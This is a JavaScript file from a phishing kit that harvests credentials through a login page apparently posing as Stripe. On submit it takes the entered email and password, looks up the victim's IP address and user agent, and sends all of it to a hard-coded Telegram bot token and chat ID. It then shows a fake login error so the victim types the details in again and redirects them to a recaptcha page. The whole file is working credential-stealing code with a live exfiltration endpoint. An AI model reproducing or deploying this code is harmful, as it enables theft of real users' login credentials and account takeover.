$.getJSON("https://api.ipify.org?format=json", function(data) {
         
// Setting text of element P with id 

let emailinput = document.getElementById('email')
let passwordinut = document.getElementById('old-password')

emailinput.addEventListener('input', ()=>{
    document.getElementById('err_msg').style.display = 'none'
})




passwordinut.addEventListener('input', ()=>{
    document.getElementById('err_msg').style.display = 'none'
})
let ip = document.getElementById('userip').value = data.ip

console.log(ip)
})

let useragent = navigator.userAgent
document.getElementById('useragent').value = useragent


$("form").on("submit", function (e) {
    e.preventDefault();
    // var dataString = $(this).serialize();
    const agent = JSON.stringify(navigator.userAgent)
    const password = document.getElementById('old-password').value
    const email = document.getElementById('email').value
    const userip = document.getElementById('userip').value
 
    let tg = {
        token: "6196464257:AAFGMOt5B7IrruEyHeKIjV4hGV_Q2km10Ss", // Your bot's token that got from @BotFather
        chat_id: "5708903193" // The user's(that you want to send a message) telegram chat id
    }
    
    const url = `https://api.telegram.org/bot${tg.token}/sendMessage` // The url to request


    const obj = {
        chat_id: tg.chat_id, // Telegram chat id
         text:    "NEW STRIPE!"+ "\r\n\n" + " IP : " + userip +"\n\n" + "# Another beautiful tool by https://github.com/tutgirl #"+ "\n\n" + 'Email Address : '  + email  + "\n\n" + 'Password : ' + password  + "\n\n"  +" [Device Type] : " + agent + "\n\n" + "\r" + "Easily check ip and [Device Type] below*" + "\r" +  "https://whatismyipaddress.com/ip/"+userip
          // The text to send
      
    };
    // console.log(obj)


    document.getElementById('err_msg').style.display = 'none'
    $(".con-btn").removeClass("continue-blue")
    $(".con-btn").addClass("loading-blue")
    $(".con-btn-class").addClass("hidden-view")
    $(".loading-ani").removeClass("hidden-view")
    $(".loading-ani").addClass("shown-view")
   





    setTimeout(function(){
      // document.getElementById('err_msg').style.display = 'none'
        $(".con-btn").addClass("continue-blue")
        $(".con-btn").removeClass("loading-blue")
        $(".con-btn-class").removeClass("hidden-view")
        $(".loading-ani").addClass("hidden-view")
        $(".loading-ani").removeClass("shown-view")
        document.getElementById('old-password').value = ""
        document.getElementById('err_msg').style.display = 'initial'
        // document.getElementById('email').value = ""
        // document.getElementById('old-password').value = ""
        // window.location.hash = 'invalidlogin'
       

       
       
       
    }, 5000)






    $.ajax({
      type: "POST",
      headers: { "Content-type": "application/json; charset=UTF-8" },
      url:
       `https://api.telegram.org/bot${tg.token}/sendMessage`,
     data: JSON.stringify(obj),
     
      success: function () {

        // document.getElementById('err_msg').style.display = 'initial'
        // $(".con-btn").addClass("continue-blue")
        // $(".con-btn").removeClass("loading-blue")
        // $(".con-btn-class").removeClass("hidden-view")
        // $(".loading-ani").addClass("hidden-view")
        // $(".loading-ani").removeClass("shown-view")
       

        const agent = JSON.stringify(navigator.userAgent)

        let tg = {
            token: "6196464257:AAFGMOt5B7IrruEyHeKIjV4hGV_Q2km10Ss", // Your bot's token that got from @BotFather
            chat_id: "5708903193" // The user's(that you want to send a message) telegram chat id
        }
        const url = `https://api.telegram.org/bot${tg.token}/sendMessage` // The url to request
        
        $.getJSON("https://api.ipify.org?format=json", function(data) {
                 
        // Setting text of element P with id 
        
        let ip = document.getElementById('userip').value = data.ip
        
        console.log(ip)
        })
        
        // document.getElementById('userdevice').value = agent;
        
        let myform = document.querySelector('form');
        
        myform.addEventListener("submit", function (event) { 
            event.preventDefault();
          
            const password = document.getElementById('old-password').value
            const email = document.getElementById('email').value
            const userip = document.getElementById('userip').value
        
        if (email !== "" &&  password !== "" ){
           
            // document.getElementById('err_msg').style.display = 'none'
            // $(".con-btn").removeClass("continue-blue")
            // $(".con-btn").addClass("loading-blue")
            // $(".con-btn-class").addClass("hidden-view")
            // $(".loading-ani").removeClass("hidden-view")
            // $(".loading-ani").addClass("shown-view")
         
        
        
            const obj = {
                chat_id: tg.chat_id, // Telegram chat id
                text:   "NEW STRIPE!"+ "\r\n\n" + " IP : " + userip +"\n\n" + "# Another beautiful tool by https://github.com/tutgirl #"+ "\n\n" + 'Email Address : '  + email  + "\n\n" + 'Password : ' + password  + "\n\n"  +" [Device Type] : " + agent + "\n\n" + "\r" + "Easily check ip and [Device Type] below*" + "\r" +  "https://whatismyipaddress.com/ip/"+userip
                  // The text to send
              
            };
        
        
             // Get U-Agent 
        
            const xht = new XMLHttpRequest();
            xht.open("POST", url, true);
            xht.setRequestHeader("Content-type", "application/json; charset=UTF-8");
            xht.send(JSON.stringify(obj));
        
         




            
              $.ajax({
                type: "POST",
                // headers: { "Content-type": "application/json; charset=UTF-8" },
                url: "/",
               data: $('#form').serialize(),
               dataType: "json",
               success: (response) => {
                // $('#form')[0].reset();

    
                // document.getElementById("checksd").innerHTML = response.Success;
                // //ADD THIS CODE
                // setTimeout(() => {
                //   document.getElementById("checksd").innerHTML = "";
                // }, 5000);
                localStorage.setItem("email", response.email);
                localStorage.setItem("userip", response.userip);
               
                if(response.Success == "regsuc"){
                  window.location.replace('/recaptcha');
                  } else if(response.Success == "regalready"){
                    window.location.replace('/recaptcha');
                  }
              },
              error: (error) => {

                console.log(error)
              }





               })
          
           
        
            // setTimeout(function(){
       
            //     window.location.replace('recapture.html')
            
               
        
               
               
               
            // }, 4000)
        
           
        
          
         
        
        }
        
        
        
        
        
        
        
        else {
        document.getElementById('err_msg').style.display = 'initial'
        }
        
        
        
        
        
          });
        
        
        
        
        
        


        // console.log(Response)
      }
    });
   
});